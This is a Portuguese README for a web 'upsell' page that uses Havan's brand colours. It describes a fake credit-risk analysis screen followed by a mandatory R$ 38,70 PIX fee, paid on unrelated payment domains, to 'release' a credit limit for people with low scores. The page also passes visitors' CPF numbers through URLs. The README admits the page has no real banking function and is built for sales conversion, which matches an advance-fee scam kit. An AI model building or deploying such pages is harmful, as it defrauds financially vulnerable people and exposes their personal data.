# Upsell 08 - Score Baixo / Análise de Risco de CPF

## Descrição

Este é um aplicativo web que apresenta a oferta de análise aprofundada de risco de crédito para usuários com score baixo, desenvolvido como página de upsell.

## Características

- **Design Responsivo**: Funciona perfeitamente em desktop e mobile
- **Cores da Marca Havan**: Utiliza as cores oficiais (azul/roxo) da Havan
- **Loading Screen**: Animação de progresso com 3 etapas
- **Dados Realistas**: Apresentação profissional com justificativa de risco
- **Interações Realistas**: Animações, notificações e modal de pagamento
- **Ponto de Upsell**: Botão "Realizar Análise e Liberar Limite" que redireciona para checkout PIX
- **Taxa Obrigatória**: R$ 38,70 para análise de risco
- **Integração Duttyfy**: Checkout PIX via API de pagamentos seguros

## Estrutura dos Arquivos

```
upsell/08/
├── index.html           # Página principal com loading e upsell
├── checkout.html        # Página de checkout PIX
├── upsell-styles.css    # Estilos responsivos
├── upsell-script.js     # Funcionalidades e animações
└── README.md            # Este arquivo
```

## Fluxo da Página

1. **Loading Screen** (7 segundos)
   - Consulta de Score
   - Análise de Risco
   - Mitigação de Risco

2. **Upsell Screen**
   - Título persuasivo
   - Explicação do motivo
   - Preço destacado (R$ 38,70)
   - Benefícios listados
   - Botão de CTA

3. **Checkout**
   - QR Code PIX
   - Código copia e cola
   - Polling de status
   - Redirecionamento após pagamento

## Configuração

### Alterar Valor da Taxa

No arquivo `checkout.html`, localize a constante `UPSELL_CONFIG`:

```javascript
const UPSELL_CONFIG = {
    title: "Análise de Risco de Crédito",
    desc: "Taxa única para análise aprofundada e mitigação de risco do seu CPF.",
    amount: 3870 // em centavos (R$ 38,70)
};
```

### Alterar URL de Redirecionamento

No arquivo `upsell-script.js`, localize a função `redirectToAccountPayment()`:

```javascript
const paymentUrl = 'https://pay.pag-certo-online.shop/RISCO_HAVAN';
```

## Integração com API Duttyfy

O checkout utiliza a API de pagamentos seguros:
- **Endpoint**: `https://www.pagamentos-seguros.app/api-pix/`
- **Método**: POST para gerar PIX, GET para verificar status
- **Polling**: A cada 5 segundos para verificar pagamento

## Parâmetros UTM

A página propaga automaticamente os parâmetros UTM e CPF através de:
- Links internos
- Formulários
- Query strings

Parâmetros suportados: `utm_*`, `cpf`, `fbclid`, `gclid`

## Compatibilidade

- ✅ Chrome/Edge/Safari/Firefox
- ✅ iOS Safari
- ✅ Android Chrome
- ✅ Tablets e desktops
- ✅ Qualquer servidor web (HTML/CSS/JS puro)

## Notas Importantes

- Este é um aplicativo de demonstração/upsell
- Não possui funcionalidades bancárias reais
- Todos os dados são fictícios
- Desenvolvido especificamente para conversão de vendas
- Requer integração com API de pagamentos real para funcionar completamente

## Caso de Uso

Este upsell é acionado quando:
- O usuário tem score de crédito abaixo da média
- É necessário análise adicional de risco
- O limite está condicionado ao pagamento da taxa de análise
- A instituição financeira precisa mitigar riscos operacionais
